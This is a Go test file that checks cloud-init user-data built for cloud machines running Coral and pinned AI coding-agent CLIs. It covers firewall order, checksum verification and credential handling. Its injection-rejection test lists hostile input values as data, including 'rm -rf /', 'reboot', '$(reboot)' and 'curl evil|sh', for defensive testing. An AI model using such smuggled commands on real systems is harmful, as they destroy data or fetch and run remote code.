package machinelaunch

import (
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"gopkg.in/yaml.v3"

	"github.com/subgentic/coral/internal/updater/verify"
)

// #9973: the cloud-init user-data: a golden for a fixed spec, what it must always say, and that nothing a caller passes can become shell.

const testCredential = "chb_TESTCREDENTIAL0123456789abcdefghij"

func goldenSpec() UserDataSpec {
	return UserDataSpec{Credential: testCredential, MaxMode: "launch", CoralVersion: "2.0.3", Agents: []string{"claude@2.0.0", "codex@0.1.0", "agy@sha256:" + strings.Repeat("ab", 32)}}
}

func TestUserDataMatchesItsGolden(t *testing.T) {
	got, err := BuildUserData(goldenSpec())
	require.NoError(t, err)
	path := filepath.Join("testdata", "userdata.golden.yaml")
	if os.Getenv("UPDATE_USERDATA_GOLDEN") == "1" {
		require.NoError(t, os.WriteFile(path, []byte(got), 0o644))
	}
	want, err := os.ReadFile(path)
	require.NoError(t, err, "run once with UPDATE_USERDATA_GOLDEN=1, then read the file")
	assert.Equal(t, string(want), got, "the user-data changed: read the diff, then UPDATE_USERDATA_GOLDEN=1 go test ./internal/machinelaunch")
}

func TestUserDataSaysWhatItMustAlwaysSay(t *testing.T) {
	got, err := BuildUserData(goldenSpec())
	require.NoError(t, err)
	// valid cloud-config
	var doc map[string]any
	require.NoError(t, yaml.Unmarshal([]byte(got), &doc))
	assert.True(t, strings.HasPrefix(got, "#cloud-config\n"))
	for _, k := range []string{"users", "packages", "write_files", "runcmd"} {
		assert.Contains(t, doc, k)
	}
	users := doc["users"].([]any)
	require.Len(t, users, 1)
	u := users[0].(map[string]any)
	assert.Equal(t, "coral", u["name"])
	assert.Equal(t, true, u["lock_passwd"], "no password")
	assert.NotContains(t, u, "sudo", "no sudo")
	assert.NotContains(t, u, "ssh_authorized_keys")
	// the firewall: deny incoming, before anything is downloaded
	i := strings.Index(got, "[ ufw, default, deny, incoming ]")
	j := strings.Index(got, "      /usr/local/sbin/coral-machine-setup\n")
	require.True(t, i > 0 && j > i, "deny incoming comes before the setup step")
	assert.Contains(t, got, "[ ufw, --force, enable ]")
	// the Coral release is verified before it is installed
	assert.Contains(t, got, "sha256sum -c expected.sum")
	assert.Less(t, strings.Index(got, "sha256sum -c expected.sum"), strings.Index(got, "tar -xzf"), "checksum before extraction")
	assert.Contains(t, got, "SHA256SUMS.txt does not list $tarball exactly once")
	assert.Contains(t, got, "--proto '=https' --tlsv1.2")
	assert.Contains(t, got, "https://github.com/subgentic/coral/releases/download/v${version}")
	assert.Contains(t, got, "set -eu", "it stops at the first failure")
	// the credential: tmpfs, 0600, owned by coral, in a folder only coral reads, written after the setup and before the service
	assert.Contains(t, got, "install -d -m 0700 -o coral -g coral /run/coral/bootstrap.d")
	assert.Contains(t, got, "install -d -m 0755 -o root -g root /run/coral\n", "/run/coral stays root's")
	assert.NotContains(t, got, "  - nodejs", "node and npm are not installed before Coral has redeemed")
	assert.Contains(t, got, "chmod 0600 /run/coral/bootstrap.d/credential")
	assert.Equal(t, 1, strings.Count(got, testCredential), "the credential appears exactly once")
	assert.NotContains(t, got, "set -x", "no shell tracing: it would print the credential")
	assert.NotContains(t, got, "set -o xtrace")
	assert.NotContains(t, got, "echo '"+testCredential, "the credential is written straight to its file, never echoed")
	assert.Contains(t, got, "(umask 077; printf '%s' '"+testCredential+"' > /run/coral/bootstrap.d/credential)", "straight to the tmpfs file, 0600")
	k := strings.Index(got, testCredential)
	assert.Greater(t, k, strings.Index(got, "      /usr/local/sbin/coral-machine-setup\n"), "after the setup step")
	assert.Less(t, k, strings.Index(got, "systemctl enable --now coral.service"), "before the service starts")
	wf := doc["write_files"].([]any)
	for _, f := range wf {
		assert.NotContains(t, f.(map[string]any)["content"], testCredential, "no file written to disk holds the credential")
	}
	// the service: as coral, loopback only, no remote, the chosen cap, the Hub's origin
	assert.Contains(t, got, "User=coral")
	assert.Contains(t, got, "ExecStart=/usr/local/bin/coral --cloud-url https://app.coralhub.dev --cloud-max-mode launch --no-browser --host 127.0.0.1")
	assert.NotContains(t, got, "--remote")
	assert.Contains(t, got, "NoNewPrivileges=true")
	// pinned agents, from the table; agy as coral and only because it was asked for unpinned
	// the credential's life is short: the agent CLIs come AFTER the service is started, and only if it is active
	svc := strings.Index(got, "systemctl enable --now coral.service")
	agents := strings.Index(got, "if systemctl is-active --quiet coral.service; then /usr/local/sbin/coral-machine-agents; fi")
	require.True(t, svc > 0 && agents > svc, "agents are installed after Coral has started")
	assert.NotContains(t, setupOf(t, doc), "npm", "nothing slow before the redeem")
	assert.NotContains(t, setupOf(t, doc), "antigravity")
	assert.Contains(t, got, "npm install -g @anthropic-ai/claude-code@2.0.0")
	assert.Contains(t, got, "npm install -g @openai/codex@0.1.0")
	assert.Contains(t, got, "curl -fsSL --proto '=https' --tlsv1.2 -o \"$installer\" 'https://antigravity.google/cli/install.sh'")
	assert.Contains(t, got, "echo '"+strings.Repeat("ab", 32)+"  '\"$installer\" | sha256sum -c -", "the installer is checked against its pinned hash")
	assert.Less(t, strings.Index(got, `sha256sum -c -`), strings.Index(got, `runuser -u coral -- bash "$installer"`), "checked before it runs")
	assert.NotContains(t, got, "| bash", "no installer is piped into a shell")
}

// setupOf is the content of the setup script (the Coral install, which runs before the credential is written).
func setupOf(t *testing.T, doc map[string]any) string {
	t.Helper()
	for _, f := range doc["write_files"].([]any) {
		m := f.(map[string]any)
		if m["path"] == "/usr/local/sbin/coral-machine-setup" {
			return m["content"].(string)
		}
	}
	t.Fatal("no setup script")
	return ""
}

func TestTheDefaultsAreTheSafeOnes(t *testing.T) {
	got, err := BuildUserData(UserDataSpec{Credential: testCredential, CoralVersion: "2.0.3"})
	require.NoError(t, err)
	assert.Contains(t, got, "--cloud-max-mode view", "an empty cap is view")
	assert.NotContains(t, got, "npm install", "no agents unless named")
	assert.NotContains(t, got, "antigravity")
	assert.NotContains(t, got, "coral-machine-agents", "and no agents step at all")
}

func TestNothingACallerPassesCanBecomeShell(t *testing.T) {
	ok := goldenSpec()
	bad := map[string]func(*UserDataSpec){
		"a credential with a quote":         func(s *UserDataSpec) { s.Credential = "chb_aaaaaaaaaaaaaaaaaaaa'; reboot; '" },
		"a credential with a newline":       func(s *UserDataSpec) { s.Credential = "chb_aaaaaaaaaaaaaaaaaaaa\nrm -rf /" },
		"a short credential":                func(s *UserDataSpec) { s.Credential = "chb_abc" },
		"another kind of credential":        func(s *UserDataSpec) { s.Credential = "chk_aaaaaaaaaaaaaaaaaaaaaaaa" },
		"an empty credential":               func(s *UserDataSpec) { s.Credential = "" },
		"a max mode that is a command":      func(s *UserDataSpec) { s.MaxMode = "launch; rm -rf /" },
		"a max mode in capitals":            func(s *UserDataSpec) { s.MaxMode = "LAUNCH" },
		"a version with a command":          func(s *UserDataSpec) { s.CoralVersion = "2.0.3; curl evil|sh" },
		"a v-prefixed version":              func(s *UserDataSpec) { s.CoralVersion = "v2.0.3" },
		"a prerelease Coral":                func(s *UserDataSpec) { s.CoralVersion = "2.0.3-rc1" },
		"no version":                        func(s *UserDataSpec) { s.CoralVersion = "" },
		"a hub url with a path":             func(s *UserDataSpec) { s.HubURL = "https://hub.example/x" },
		"a hub url over http":               func(s *UserDataSpec) { s.HubURL = "http://app.coralhub.dev" },
		"a hub url with a shell escape":     func(s *UserDataSpec) { s.HubURL = "https://a.b$(reboot)" },
		"an unpinned npm agent":             func(s *UserDataSpec) { s.Agents = []string{"claude"} },
		"an npm agent said unpinned":        func(s *UserDataSpec) { s.Agents = []string{"claude@unpinned"} },
		"an agent version with a quote":     func(s *UserDataSpec) { s.Agents = []string{"claude@1.0.0';id;'"} },
		"an agent version with a space":     func(s *UserDataSpec) { s.Agents = []string{"codex@1.0.0 --foo"} },
		"agy pinned by version":             func(s *UserDataSpec) { s.Agents = []string{"agy@1.2.3"} },
		"agy unpinned":                      func(s *UserDataSpec) { s.Agents = []string{"agy@unpinned"} },
		"agy with a short hash":             func(s *UserDataSpec) { s.Agents = []string{"agy@sha256:abc"} },
		"agy with an upper-case hash":       func(s *UserDataSpec) { s.Agents = []string{"agy@sha256:" + strings.Repeat("AB", 32)} },
		"an agent that is not in the table": func(s *UserDataSpec) { s.Agents = []string{"evil@1.0.0"} },
		"a terminal":                        func(s *UserDataSpec) { s.Agents = []string{"terminal@1.0.0"} },
		"an agent twice":                    func(s *UserDataSpec) { s.Agents = []string{"claude@1.0.0", "claude@1.0.1"} },
		"agy twice by two names": func(s *UserDataSpec) {
			s.Agents = []string{"agy@sha256:" + strings.Repeat("ab", 32), "gemini@sha256:" + strings.Repeat("cd", 32)}
		},
	}
	for name, mut := range bad {
		s := ok
		s.Agents = append([]string(nil), ok.Agents...)
		mut(&s)
		_, err := BuildUserData(s)
		assert.Error(t, err, name)
	}
}

func TestTheSetupScriptIsValidShellAndTheRepoMatchesTheUpdater(t *testing.T) {
	assert.Equal(t, verify.Repo, coralRepo, "the release repository is the updater's")
	if runtime.GOOS == "windows" {
		t.Skip("sh -n is checked where there is a sh")
	}
	sh, err := exec.LookPath("sh")
	if err != nil {
		t.Skip("no sh")
	}
	got, err := BuildUserData(goldenSpec())
	require.NoError(t, err)
	var doc struct {
		WriteFiles []struct {
			Path    string `yaml:"path"`
			Content string `yaml:"content"`
		} `yaml:"write_files"`
		Runcmd []any `yaml:"runcmd"`
	}
	require.NoError(t, yaml.Unmarshal([]byte(got), &doc))
	checked := 0
	for _, f := range doc.WriteFiles {
		if strings.HasPrefix(f.Path, "/usr/local/sbin/coral-machine-") {
			require.NoError(t, exec.Command(sh, "-n", "-c", f.Content).Run(), "%s parses", f.Path)
			checked++
		}
	}
	for _, r := range doc.Runcmd {
		if s, ok := r.(string); ok {
			require.NoError(t, exec.Command(sh, "-n", "-c", s).Run(), "the runcmd step parses")
			checked++
		}
	}
	assert.Equal(t, 4, checked, "the setup script, the agents script, the Coral step and the agents step")
}
